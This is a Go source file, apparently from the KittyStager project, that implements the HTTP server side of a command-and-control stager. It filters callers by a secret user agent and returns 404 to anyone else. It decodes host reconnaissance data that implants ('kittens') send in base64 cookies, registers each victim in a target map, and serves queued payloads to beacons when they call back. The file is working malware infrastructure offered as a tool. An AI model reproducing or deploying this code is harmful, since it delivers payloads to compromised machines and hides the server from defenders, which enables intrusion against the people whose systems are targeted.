package http

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/util"
	b64 "encoding/base64"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"net/http"
	"time"
)

var (
	userA    string
	defSleep int
)

func CreateHttpServer(conf config.General) {
	Targets = make(map[string]*Kitten)
	defSleep = conf.GetSleep()
	address := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
	userA = conf.GetUserAgent()
	fmt.Printf("%s %s\n\n", color.Green("[+] Started http server on"), color.Yellow(address))
	http.HandleFunc(conf.GetEndpoint(), logRequest)
	err := http.ListenAndServe(address, nil)
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// Logs the requests from the beacons
func logRequest(w http.ResponseWriter, r *http.Request) {
	c := util.NewInitialChecks()
	userAgent := r.UserAgent()
	//check if the user agent is correct
	if userAgent != userA {
		w.WriteHeader(404)
		fmt.Printf("\n%s\n", color.Yellow("[!] Unauthorized user agent: "+userAgent))
		return
	}
	cookie := r.Header.Get("Cookie")
	out, err := b64.StdEncoding.DecodeString(cookie)
	//check if the cookie is initial callback
	if len(cookie) > 50 {
		//out, err := b64.StdEncoding.DecodeString(cookie)
		if err != nil {
			util.ErrPrint(err)
			return
		}
		c, err = util.InitUnmarshalJSON(out)
		if err != nil {
			util.ErrPrint(err)
			return
		}
		//If the beacon is not in the map, add it
		fmt.Printf("\n%s %s\n", color.Green("[+] Request from:"), color.Yellow(c.GetIp()))
		fmt.Printf("%s %s\n", color.Green("[+] Kitten name:"), color.Yellow(c.GetKittenName()))
		fmt.Printf("%s %s\n", color.Green("[+] User-Agent:"), color.Yellow(r.UserAgent()))

		Targets[c.KittenName] = &Kitten{
			Name:       c.GetKittenName(),
			Id:         len(Targets),
			LastSeen:   time.Now(),
			Sleep:      defSleep,
			Alive:      true,
			InitChecks: *c,
		}
		_, err = w.Write(Targets[c.GetKittenName()].GetPayload())
		if err != nil {
			return
		}
		err = util.PrintCookie(out)
		if err != nil {
			fmt.Println(color.Red("Error printing cookie"))
			return
		}
		// regular callback
	} else {
		kittenName := string(out)
		if _, ok := Targets[kittenName]; ok {
			_, err := w.Write(Targets[kittenName].GetPayload())
			Targets[kittenName].SetLastSeen(time.Now())
			if err != nil {
				return
			}
			Targets[kittenName].SetPayload(nil)
			return
		}
	}
}
